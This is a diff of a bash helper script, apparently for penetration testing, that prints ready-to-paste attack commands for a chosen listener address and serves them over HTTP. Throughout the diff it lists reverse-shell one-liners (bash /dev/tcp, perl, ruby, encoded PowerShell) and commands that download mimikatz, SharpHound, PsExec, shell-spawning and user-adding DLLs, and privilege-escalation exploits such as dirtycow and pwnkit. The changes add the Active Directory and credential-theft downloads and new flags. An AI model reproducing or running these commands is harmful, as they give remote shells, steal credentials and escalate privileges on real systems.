@@ -42,8 +42,10 @@ list_stuff() {
     echo ""
     echo "bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lhost%2F$lport%200%3E%261%22" # use with php above
     echo ""
-    echo -n "powershell%20-enc%20"; pwsh -File payloads/create_ps_revshell.ps1 "$lhost" "$lport" # use with php above
-    echo ""
+    if $1; then
+        echo -n "powershell%20-enc%20"; pwsh -File scripts/create_ps_revshell.ps1 "$lhost" "$lport" # use with php above
+        echo ""
+    fi
     echo ""
     echo "ONE LINERS"
     echo "=============================================="
@@ -58,19 +60,29 @@ list_stuff() {
     echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
     echo ""
     echo "ruby -rsocket -e'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
-    echo ""
+    echo ""    
+    if $1; then
+        python3 scripts/genps_quiet.py $lhost $lport
+        echo ""
+    fi
     echo ""
     echo "ACTIVE DIRECTORY"
     echo "=============================================="
     echo "iwr -uri http://$lhost/enum/PowerView.ps1 -OutFile PowerView.ps1"
     echo ""
+    echo "iwr -uri http://$lhost/enum/SharpHound.exe -OutFile SharpHound.exe"
+    echo "iwr -uri http://$lhost/enum/SharpHound.ps1 -OutFile SharpHound.ps1"
     echo ""
-    echo "PRIV ESC"
+    echo "iwr -uri http://$lhost/enum/PSTools/PsLoggedon.exe -OutFile PsLoggedon.exe"
+    echo "iwr -uri http://$lhost/enum/PSTools/PsExec.exe -OutFile PsExec.exe"
+    echo ""
+    echo "iwr -uri http://$lhost/payloads/mimikatz/mimilib.dll -OutFile mimilib.dll"
+    echo "iwr -uri http://$lhost/payloads/mimikatz/mimidrv.sys -OutFile mimidrv.sys"
+    echo "iwr -uri http://$lhost/payloads/mimikatz/mimikatz.exe -OutFile mimikatz.exe"
+    echo ""
+    echo ""
+    echo "WINDOWS PRIV ESCALATION"
     echo "=============================================="
-    echo "wget http://$lhost/enum/linpeas.sh"
-    echo "wget http://$lhost/enum/LinEnum.sh"
-    echo "wget http://$lhost/enum/unix-privesc-check"
-    echo ""
     echo "iwr -uri http://$lhost/enum/winPEASx64.exe -OutFile winpeas.exe"
     echo "iwr -uri http://$lhost/enum/PowerUp.ps1 -OutFile PowerUp.ps1"
     echo ""
@@ -80,8 +92,19 @@ list_stuff() {
     echo "iwr -uri http://$lhost/payloads/cppdll_useradd.dll -OutFile cppdll_useradd.dll"
     echo "iwr -uri http://$lhost/payloads/cppdll_shell.dll -OutFile cppdll_shell.dll"
     echo ""
-    echo "iwr -uri http://$lhost/exploits/PrintSpoof64.exe -OutFile PrintSpoof64.exe"
+    echo "iwr -uri http://$lhost/exploits/PrintSpoofer64.exe -OutFile PrintSpoofer64.exe"
+    echo ""
+    echo ""
+    echo "LINUX PRIV ESCALATION"
+    echo "=============================================="
+    echo "wget http://$lhost/enum/linpeas.sh"
+    echo "wget http://$lhost/enum/LinEnum.sh"
+    echo "wget http://$lhost/enum/unix-privesc-check"
+    echo ""
     echo "wget http://$lhost/exploits/cve-2021-4034-poc.c"
+    echo "wget -r -nH http://$lhost/exploits/nss_exploit/"
+    echo "wget http://$lhost/exploits/dirtycow.c"
+    echo "wget http://$lhost/exploits/polkit.sh"
     echo ""
 }
 
@@ -96,16 +119,24 @@ start_http_server() {
 
 custom_lhost=false
 compile=false
+genshells=false
 start_python=true
+compile_and_dontlist=false
 
 # Parse arguments
-while getopts ":csi:p:" opt; do
+while getopts ":cdgsi:p:" opt; do
     case ${opt} in
-    s )
-        start_python=false
-        ;;
     c )
         compile=true
+        ;;
+    d )
+        compile_and_dontlist=true
+        ;;
+    g )
+        genshells=true
+        ;;
+    s )
+        start_python=false
         ;;
     i )
         lhost=${OPTARG}
@@ -130,8 +161,14 @@ if $compile; then
     set_payloads
 fi
 
-list_stuff
+if $compile_and_dontlist; then
+    set_payloads
+else
+    list_stuff $genshells
 
-if $start_python; then
-    start_http_server
+    if $start_python; then
+        start_http_server
+    fi
 fi
+
+
